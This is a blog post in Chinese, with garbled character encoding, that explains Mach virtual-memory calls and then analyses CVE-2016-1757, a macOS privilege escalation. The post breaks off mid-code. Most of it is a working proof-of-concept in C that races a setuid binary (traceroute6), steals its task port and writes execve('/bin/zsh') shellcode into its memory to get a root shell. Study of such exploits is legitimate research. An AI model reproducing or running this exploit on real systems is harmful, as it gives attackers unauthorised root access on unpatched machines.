<h3 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h3><p>è™šæ‹Ÿå†…å­˜æ˜¯Macä¸­æä¾›çš„æœ€é‡è¦çš„æœºåˆ¶ï¼Œè™šæ‹Ÿå†…å­˜ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªå±‚æ¬¡ï¼Œä¸€ä¸ªæ˜¯è™šæ‹Ÿå†…å­˜å±‚ï¼Œä¸€ä¸ªæ˜¯ç‰©ç†å†…å­˜å±‚ã€‚ç”±äºè¿™é‡Œä»…åˆ†æpocä¸­ç”¨åˆ°çš„ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œå…³äºè™šæ‹Ÿå†…å­˜è¯¦ç»†çš„åˆ†æåœ¨è¿™é‡Œå°±ä¸å†è¯¦ç»†è¯´æ˜äº†</p>
<p>Machåœ¨ç”¨æˆ·å±‚ä¹Ÿæä¾›äº†ä¸°å¯Œçš„å†…å­˜ç›¸å…³çš„API<br>åœ¨ç”¨æˆ·æ€ï¼Œç¨‹åºå¯ä»¥åœ¨vm_map_tå±‚æ¬¡è°ƒç”¨API(è¿™é‡Œåªä»‹ç»éƒ¨åˆ†ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹mach_vm.hæ–‡ä»¶)ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> mach_vm_region</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target_task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> *address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> *size,</div><div class="line">	<span class="keyword">vm_region_flavor_t</span> flavor,</div><div class="line">	<span class="keyword">vm_region_info_t</span> info,</div><div class="line">	<span class="keyword">mach_msg_type_number_t</span> *infoCnt,</div><div class="line">	<span class="keyword">mach_port_t</span> *object_name</div><div class="line">);</div><div class="line"><span class="keyword">kern_return_t</span> mach_vm_allocate</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> *address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> size,</div><div class="line">	<span class="keyword">int</span> flags</div><div class="line">);</div><div class="line"><span class="keyword">kern_return_t</span> mach_vm_protect</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target_task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> size,</div><div class="line">	<span class="keyword">boolean_t</span> set_maximum,</div><div class="line">	<span class="keyword">vm_prot_t</span> new_protection</div><div class="line">);</div><div class="line"><span class="keyword">kern_return_t</span> mach_vm_read</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target_task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> size,</div><div class="line">	<span class="keyword">vm_offset_t</span> *data,</div><div class="line">	<span class="keyword">mach_msg_type_number_t</span> *dataCnt</div><div class="line">);</div><div class="line"><span class="keyword">kern_return_t</span> mach_vm_write</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target_task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> address,</div><div class="line">	<span class="keyword">vm_offset_t</span> data,</div><div class="line">	<span class="keyword">mach_msg_type_number_t</span> dataCnt</div><div class="line">);</div><div class="line"><span class="keyword">kern_return_t</span> mach_vm_map</div><div class="line">(</div><div class="line">	<span class="keyword">vm_map_t</span> target_task,</div><div class="line">	<span class="keyword">mach_vm_address_t</span> *address,</div><div class="line">	<span class="keyword">mach_vm_size_t</span> size,</div><div class="line">	<span class="keyword">mach_vm_offset_t</span> mask,</div><div class="line">	<span class="keyword">int</span> flags,</div><div class="line">	<span class="keyword">mem_entry_name_port_t</span> object,</div><div class="line">	<span class="keyword">memory_object_offset_t</span> offset,</div><div class="line">	<span class="keyword">boolean_t</span> copy,</div><div class="line">	<span class="keyword">vm_prot_t</span> cur_protection,</div><div class="line">	<span class="keyword">vm_prot_t</span> max_protection,</div><div class="line">	<span class="keyword">vm_inherit_t</span> inheritance</div><div class="line">);</div></pre></td></tr></table></figure>
<ul>
<li><code>mach_vm_region</code><br>æ ¹æ®flavorï¼Œæ˜¾ç¤ºä»»åŠ¡çš„è™šæ‹Ÿæ˜ å°„åœ¨addresså‡ºçš„è™šæ‹Ÿå†…å­˜åŒºåŸŸçš„ä¿¡æ¯</li>
<li><code>mach_vm_allocate</code><br>åœ¨mapè¡¨ç¤ºçš„è™šæ‹Ÿå†…å­˜ä¸­åˆ†é…sizeä¸ªå­—èŠ‚</li>
<li><code>mach_vm_protect</code><br>å°†mapè¡¨ç¤ºçš„è™šæ‹Ÿå†…å­˜ä¸­ä»staråˆ°star+sizeèŒƒå›´çš„å†…å­˜åŒºåŸŸçš„ä¿æŠ¤çº§åˆ«è®¾ç½®ä¸ºå®šä¹‰çš„æœ€é«˜çº§åˆ«</li>
<li><code>mach_vm_read</code><br>ä»å¤–éƒ¨ä»»åŠ¡çš„å†…å­˜ä¸­å¤åˆ¶ï¼Œä»mapè¡¨ç¤ºçš„è™šæ‹Ÿå†…å­˜ä¸­çš„addrå‡ºè¯»sizeåˆ°dataä¸­</li>
<li><code>mach_vm_write</code><br>å¤åˆ¶åˆ°å¤–éƒ¨ä»»åŠ¡çš„å†…å­˜ï¼šå°†dataå¤åˆ¶åˆ°mapè¡¨ç¤ºçš„è™šæ‹Ÿå†…å­˜ä¸­çš„addresså¤„</li>
<li><code>mach_vm_map</code><br>åˆ›å»ºæ–°çš„å†…å­˜æ˜ å°„</li>
</ul>
<h2 id="ç¬¬äºŒéƒ¨åˆ†â€”-cve-2016-1757åˆ†æ"><a href="#ç¬¬äºŒéƒ¨åˆ†â€”-cve-2016-1757åˆ†æ" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†â€”-cve-2016-1757åˆ†æ"></a>ç¬¬äºŒéƒ¨åˆ†â€”-cve-2016-1757åˆ†æ</h2><p>cve-2016-1757ä¸»è¦æ˜¯å†…æ ¸å¤„ç†ä¸€ä¸ªsetuidç¨‹åºæ—¶ï¼Œå½“è¿›ç¨‹çš„ç«¯å£è¿˜æ²¡æœ‰å…³é—­æ—¶ï¼Œçˆ¶è¿›ç¨‹çš„ç«¯å£å¯ä»¥æ§åˆ¶å­è¿›ç¨‹çš„ç«¯å£ä»è€Œå¯¹ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ä½œå‡ºä¿®æ”¹ï¼Œå¹¶åˆ©ç”¨ç›®æ ‡è¿›ç¨‹çš„rootæƒé™è¿›è¡Œshellcode</p>
<p>è¿™ä¸ªæ¼æ´é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä¸Špoc<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_error.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_vm.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;servers/bootstrap.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// execve("/bin/zsh", &#123;"/bin/sh", 0&#125;, 0); // honest!</span></div><div class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\xe8\x09\x00\x00\x00\x2f\x62\x69\x6e\x2f\x7a\x73\x68\x00\x5f\x48"</span></div><div class="line">                   <span class="string">"\x31\xdb\x53\x57\x48\x89\xe6\x48\x31\xd2\xb8\x3b\x00\x00\x02\x0f"</span></div><div class="line">                   <span class="string">"\x05"</span>;</div><div class="line"></div><div class="line"><span class="keyword">char</span>* service_name = <span class="string">"task_deposit_service"</span>;</div><div class="line"><span class="keyword">char</span>* suid_binary_path = <span class="string">"/usr/sbin/traceroute6"</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">  <span class="keyword">mach_msg_header_t</span> header;</div><div class="line">  <span class="keyword">mach_msg_body_t</span> body;</div><div class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</div><div class="line">&#125; <span class="keyword">task_msg_send_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">  <span class="keyword">mach_msg_header_t</span> header;</div><div class="line">  <span class="keyword">mach_msg_body_t</span> body;</div><div class="line">  <span class="keyword">mach_msg_port_descriptor_t</span> port;</div><div class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">&#125; <span class="keyword">task_msg_recv_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">  <span class="keyword">mach_msg_header_t</span> header;</div><div class="line">&#125; <span class="keyword">ack_msg_send_t</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</div><div class="line">  <span class="keyword">mach_msg_header_t</span> header;</div><div class="line">  <span class="keyword">mach_msg_trailer_t</span> trailer;</div><div class="line">&#125; <span class="keyword">ack_msg_recv_t</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_parent</span><span class="params">(<span class="keyword">mach_port_t</span> service_port)</span> </span>&#123;</div><div class="line">  <span class="keyword">kern_return_t</span> err;</div><div class="line"></div><div class="line">  <span class="comment">// generate the page we want to write into the child:</span></div><div class="line">  <span class="comment">//ç”Ÿæˆä¸€é¡µæƒ³è¦å†™å…¥å­è¿›ç¨‹çš„å†…å­˜</span></div><div class="line">  <span class="keyword">mach_vm_address_t</span> addr = <span class="number">0</span>;</div><div class="line">  err = mach_vm_allocate(mach_task_self(),</div><div class="line">                         &amp;addr,</div><div class="line">                         <span class="number">4096</span>,</div><div class="line">                         VM_FLAGS_ANYWHERE);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"failed to mach_vm_allocate memory"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  FILE* f = fopen(suid_binary_path, <span class="string">"r"</span>);</div><div class="line">  fseek(f, <span class="number">0x1000</span>, SEEK_SET);</div><div class="line"></div><div class="line">  fread((<span class="keyword">char</span>*)addr, <span class="number">0x1000</span>, <span class="number">1</span>, f);</div><div class="line">  fclose(f);</div><div class="line">  </div><div class="line">  <span class="built_in">memcpy</span>(((<span class="keyword">char</span>*)addr)+<span class="number">0x53c</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</div><div class="line"></div><div class="line">  <span class="comment">// wait to get the child's task port on the service port:</span></div><div class="line">  <span class="comment">//ç­‰å¾…å­è¿›ç¨‹å‘é€è¿‡æ¥çš„ä»»åŠ¡ç«¯å£</span></div><div class="line">  <span class="keyword">task_msg_recv_t</span> msg = &#123;<span class="number">0</span>&#125;;</div><div class="line">  err = mach_msg(&amp;msg.header,</div><div class="line">                 MACH_RCV_MSG,</div><div class="line">                 <span class="number">0</span>,</div><div class="line">                 <span class="keyword">sizeof</span>(msg),</div><div class="line">                 service_port,</div><div class="line">                 MACH_MSG_TIMEOUT_NONE,</div><div class="line">                 MACH_PORT_NULL);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"error receiving service message"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="keyword">mach_port_t</span> target_task_port = msg.port.name;</div><div class="line">  </div><div class="line">  <span class="comment">// before we ack the task port message to signal that the other process should execve the suid</span></div><div class="line">  <span class="comment">// binary get the lowest mapped address:</span></div><div class="line">  <span class="comment">//å¯¹ä»»åŠ¡ç«¯å£çš„æ¶ˆæ¯åšå‡ºåº”ç­”ä¹‹å‰ç¡®å®šæ˜¯å¦ä¸ºsetuidçš„è¿›ç¨‹</span></div><div class="line">  <span class="keyword">struct</span> vm_region_basic_info_64 region;</div><div class="line">  <span class="keyword">mach_msg_type_number_t</span> region_count = VM_REGION_BASIC_INFO_COUNT_64;</div><div class="line">  <span class="keyword">memory_object_name_t</span> object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></div><div class="line">  </div><div class="line">  <span class="keyword">mach_vm_size_t</span> target_first_size = <span class="number">0x1000</span>;</div><div class="line">  <span class="keyword">mach_vm_address_t</span> original_first_addr = <span class="number">0x0</span>;</div><div class="line">  <span class="comment">//è·å–è™šæ‹Ÿå†…å­˜çš„ä¿¡æ¯</span></div><div class="line">  err = mach_vm_region(target_task_port,</div><div class="line">                       &amp;original_first_addr,</div><div class="line">                       &amp;target_first_size,</div><div class="line">                       VM_REGION_BASIC_INFO_64,</div><div class="line">                       (<span class="keyword">vm_region_info_t</span>)&amp;region,</div><div class="line">                       &amp;region_count,</div><div class="line">                       &amp;object_name);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"unable to get first mach_vm_region for target process\n"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"[+] looks like the target processes lowest mapping is at %zx prior to execve\n"</span>, original_first_addr);</div><div class="line"></div><div class="line">  <span class="comment">// send an ack message to the reply port indicating that we have the thread port</span></div><div class="line">  <span class="comment">//å‘é€æ¶ˆæ¯ä½œå‡ºå›åº”</span></div><div class="line">  <span class="keyword">ack_msg_send_t</span> ack = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">  <span class="keyword">mach_msg_type_name_t</span> reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</div><div class="line"></div><div class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>);</div><div class="line">  ack.header.msgh_size = <span class="keyword">sizeof</span>(ack);</div><div class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</div><div class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</div><div class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, <span class="number">0</span>); <span class="comment">// use the same rights we got</span></div><div class="line"> </div><div class="line">  err = mach_msg_send(&amp;ack.header);</div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"parent failed sending ack"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">mach_vm_address_t</span> target_first_addr = <span class="number">0x0</span>;</div><div class="line">  <span class="comment">//ä¸æ–­åœ°å¾ªç¯ç›´åˆ°è·å¾—çš„å†…å­˜ä¿¡æ¯ä¸ä¹‹å‰ä¸åŒ</span></div><div class="line">  <span class="keyword">for</span> (;;) &#123;</div><div class="line">    <span class="comment">// wait until we see that the map has been swapped and the binary is loaded into it:</span></div><div class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</div><div class="line">    object_name = MACH_PORT_NULL; <span class="comment">/* unused */</span></div><div class="line">    target_first_size = <span class="number">0x1000</span>;</div><div class="line">    target_first_addr = <span class="number">0x0</span>;</div><div class="line"></div><div class="line">    err = mach_vm_region(target_task_port,</div><div class="line">                         &amp;target_first_addr,</div><div class="line">                         &amp;target_first_size,</div><div class="line">                         VM_REGION_BASIC_INFO_64,</div><div class="line">                         (<span class="keyword">vm_region_info_t</span>)&amp;region,</div><div class="line">                         &amp;region_count,</div><div class="line">                         &amp;object_name);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; <span class="number">0x200000000</span>) &#123;</div><div class="line">      <span class="comment">// the first address has changed implying that the map was swapped</span></div><div class="line">      <span class="comment">// let's try to win the race</span></div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">mach_vm_address_t</span> target_addr = target_first_addr + <span class="number">0x1000</span>;</div><div class="line">  <span class="keyword">mach_msg_type_number_t</span> target_size = <span class="number">0x1000</span>;</div><div class="line">  mach_vm_protect(target_task_port, target_addr, target_size, <span class="number">0</span>, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</div><div class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"hopefully overwrote some code in the target...\n"</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"the target first addr changed to %zx\n"</span>, target_first_addr);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">kern_return_t</span> err;</div><div class="line"></div><div class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</div><div class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"child can't get bootstrap port"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">mach_port_t</span> service_port;</div><div class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"child can't get service port"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// create a reply port:</span></div><div class="line">  <span class="comment">//åˆ›å»ºä¸€ä¸ªæœ‰æ¥æ”¶æ¶ˆæ¯æƒé™çš„port</span></div><div class="line">  <span class="keyword">mach_port_t</span> reply_port;</div><div class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"child unable to allocate reply port"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// send it our task port</span></div><div class="line">  <span class="comment">//å°†æˆ‘ä»¬çš„ä»»åŠ¡ç«¯å£å‘é€ç»™çˆ¶è¿›ç¨‹</span></div><div class="line">  <span class="keyword">task_msg_send_t</span> msg = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">  msg.header.msgh_size = <span class="keyword">sizeof</span>(msg);</div><div class="line">  msg.header.msgh_local_port = reply_port;</div><div class="line">  msg.header.msgh_remote_port = service_port;</div><div class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</div><div class="line">  </div><div class="line">  msg.body.msgh_descriptor_count = <span class="number">1</span>;</div><div class="line"></div><div class="line">  msg.port.name = mach_task_self();</div><div class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</div><div class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</div><div class="line"></div><div class="line">  err = mach_msg_send(&amp;msg.header);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"child unable to send thread port message"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// wait for a reply to ack that the other end got our thread port</span></div><div class="line">  <span class="comment">//ç­‰å¾…çˆ¶è¿›ç¨‹çš„åº”ç­”</span></div><div class="line">  <span class="keyword">ack_msg_recv_t</span> reply = &#123;<span class="number">0</span>&#125;;</div><div class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, <span class="number">0</span>, <span class="keyword">sizeof</span>(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"child unable to receive ack"</span>, err);</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// exec the suid-root binary</span></div><div class="line">  <span class="comment">//æ‰§è¡Œæœ‰rootæƒé™çš„setuidè¿›ç¨‹</span></div><div class="line">  <span class="keyword">char</span>* argv[] = &#123;suid_binary_path, <span class="string">"-w"</span>, <span class="string">"rofl"</span>, <span class="literal">NULL</span>&#125;;</div><div class="line">  <span class="keyword">char</span>* envp[] = &#123;<span class="literal">NULL</span>&#125;;</div><div class="line">  execve(suid_binary_path, argv, envp);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">  <span class="keyword">kern_return_t</span> err;</div><div class="line"></div><div class="line">  <span class="comment">// register a name with launchd</span></div><div class="line">  <span class="keyword">mach_port_t</span> bootstrap_port;</div><div class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"can't get bootstrap port"</span>, err);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¥æ”¶æ¶ˆæ¯æƒé™çš„port</span></div><div class="line">  <span class="keyword">mach_port_t</span> service_port;</div><div class="line">  err = mach_port_allocate(mach_task_self(),</div><div class="line">                           MACH_PORT_RIGHT_RECEIVE,</div><div class="line">                           &amp;service_port);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"can't allocate service port"</span>, err);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//ä¸ºportæ·»åŠ å‘é€æƒé™</span></div><div class="line">  err = mach_port_insert_right(mach_task_self(),</div><div class="line">                               service_port,</div><div class="line">                               service_port,</div><div class="line">                               MACH_MSG_TYPE_MAKE_SEND);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(<span class="string">"can't insert make send right"</span>, err);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">//æ³¨å†Œä¸€ä¸ªå…¨å±€port</span></div><div class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</div><div class="line">  </div><div class="line">  <span class="keyword">if</span> 